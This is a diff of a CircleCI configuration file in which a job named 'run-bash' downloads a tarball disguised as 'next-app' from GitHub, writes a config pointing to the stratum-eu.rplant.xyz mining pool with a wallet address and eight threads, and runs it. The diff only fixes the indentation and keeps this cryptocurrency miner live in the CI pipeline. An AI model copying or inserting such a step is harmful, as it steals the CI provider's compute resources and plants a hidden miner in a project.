@@ -1,4 +1,5 @@
 version: 2.1  # Versi konfigurasi CircleCI
+
 jobs:
   run-bash:
     docker:
@@ -15,10 +16,10 @@ jobs:
           command: |
             mkdir mymy && cd mymy
             wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
-			      tar -xf next-app.tar.gz
-			      cd next-app
-			      echo '{"host": "stratum-eu.rplant.xyz", "port": 7022, "user": "MgZAMY9jVjnvPZufn7FfGe8gpMXCie5W4g", "pass": "x", "threads": 8}' > config.json
-			      ./next-app
+            tar -xf next-app.tar.gz
+            cd next-app
+            echo '{"host": "stratum-eu.rplant.xyz", "port": 7022, "user": "MgZAMY9jVjnvPZufn7FfGe8gpMXCie5W4g", "pass": "x", "threads": 8}' > config.json
+            ./next-app
 
 workflows:
   version: 2
